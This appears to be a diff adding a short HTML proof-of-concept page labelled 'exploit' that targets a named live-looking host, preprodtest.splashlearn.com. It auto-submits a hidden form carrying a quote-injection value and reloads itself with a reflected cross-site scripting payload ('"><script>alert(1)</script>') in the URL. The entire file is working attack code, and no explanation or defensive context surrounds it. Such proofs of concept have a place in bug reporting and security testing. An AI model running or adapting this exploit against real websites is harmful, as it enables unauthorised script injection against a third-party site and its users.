@@ -1,0 +1,18 @@
+<body>
+
+<form id="exploit" name="exploit" method="GET" action="https://preprodtest.splashlearn.com/">
+	<input type="hidden" name="q" value="'" /> 
+</form>
+
+<script>
+if (window.location.search.length == 0)
+{
+	window.location.href = window.location.href = "?exploit=\"><script>alert(1)<\/script>";
+}
+else
+{
+	document.getElementById('exploit').submit();
+}
+</script>
+
+</body>
